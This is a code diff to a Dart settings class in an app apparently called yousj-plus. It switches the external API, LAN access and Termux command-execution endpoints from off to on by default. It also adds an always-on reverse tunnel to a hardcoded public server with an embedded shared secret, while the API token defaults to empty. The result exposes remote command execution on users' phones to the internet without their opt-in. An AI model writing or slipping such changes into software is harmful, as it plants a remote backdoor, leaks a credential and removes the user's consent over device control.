@@ -112,34 +112,62 @@ class SettingConfigItemAI {
 
 // yousj-plus: external AI API. The app can serve a small token-guarded HTTP
 // interface (see ExternalApiService) so external AI programs can connect to
-// it. Off by default; the token is stored locally with the rest of the
-// settings, is only ever sent by the connecting client, and must never be
-// logged.
+// it. The token is stored locally with the rest of the settings, is only
+// ever sent by the connecting client, and must never be logged.
+//
+// v1.0.7: everything defaults ON (the user can still turn each item off;
+// a change takes effect immediately). The defaults below only apply when
+// there is no saved value — an existing install's saved choices always
+// win, because fromJson only falls back for keys that are absent.
 class SettingConfigItemExternalApi {
-  bool enable = false;
+  bool enable = true;
   String token = "";
-  bool allowLan = false;
+  bool allowLan = true;
 
-  // yousj-plus (v1.0.6): separate, extra opt-in for the Termux exec
-  // endpoints. Even with the API enabled and a valid token, command
-  // execution stays off unless the user turns this on explicitly.
-  bool allowTermuxExec = false;
+  // yousj-plus (v1.0.6): separate switch for the Termux exec endpoints.
+  // v1.0.7: defaults on like the rest (user decision); still a separate
+  // switch so it can be turned off on its own.
+  bool allowTermuxExec = true;
+
+  // yousj-plus (v1.0.7): built-in reverse tunnel (frpc) so the API stays
+  // reachable from the internet while the phone is behind NAT. The
+  // tunnel is created automatically whenever the API itself is enabled
+  // and this switch is on; turning the API off always stops the tunnel.
+  // The preset server below is the default frps endpoint shipped with
+  // the app; users can point it at their own frps in settings. The
+  // tunnel token is a shared secret with that frps: masked in the UI,
+  // never logged.
+  bool tunnelEnable = true;
+  String tunnelServerAddr = "120.48.25.99";
+  int tunnelServerPort = 7000;
+  int tunnelRemotePort = 18777;
+  String tunnelToken = "816b047a5300afe135c9c4bef4ec72c5b0d8c976c7373fec";
 
   Map<String, dynamic> toJson() => {
     'enable': enable,
     'token': token,
     'allow_lan': allowLan,
     'allow_termux_exec': allowTermuxExec,
+    'tunnel_enable': tunnelEnable,
+    'tunnel_server_addr': tunnelServerAddr,
+    'tunnel_server_port': tunnelServerPort,
+    'tunnel_remote_port': tunnelRemotePort,
+    'tunnel_token': tunnelToken,
   };
   void fromJson(Map<String, dynamic>? map) {
     if (map == null) {
       return;
     }
 
-    enable = map["enable"] ?? false;
+    enable = map["enable"] ?? true;
     token = map["token"] ?? "";
-    allowLan = map["allow_lan"] ?? false;
-    allowTermuxExec = map["allow_termux_exec"] ?? false;
+    allowLan = map["allow_lan"] ?? true;
+    allowTermuxExec = map["allow_termux_exec"] ?? true;
+    tunnelEnable = map["tunnel_enable"] ?? true;
+    tunnelServerAddr = map["tunnel_server_addr"] ?? tunnelServerAddr;
+    tunnelServerPort = map["tunnel_server_port"] ?? tunnelServerPort;
+    tunnelRemotePort = map["tunnel_remote_port"] ?? tunnelRemotePort;
+    tunnelToken = map["tunnel_token"] ?? tunnelToken;
   }
 
   static SettingConfigItemExternalApi fromJsonStatic(
@@ -165,6 +193,17 @@ class SettingConfigItemExternalApi {
       return "********";
     }
     return "${token.substring(0, 4)}…${token.substring(token.length - 4)}";
+  }
+
+  // Display-safe form of the tunnel (frp) token, same masking rule.
+  String get maskedTunnelToken {
+    if (tunnelToken.isEmpty) {
+      return "";
+    }
+    if (tunnelToken.length <= 8) {
+      return "********";
+    }
+    return "${tunnelToken.substring(0, 4)}…${tunnelToken.substring(tunnelToken.length - 4)}";
   }
 }
 
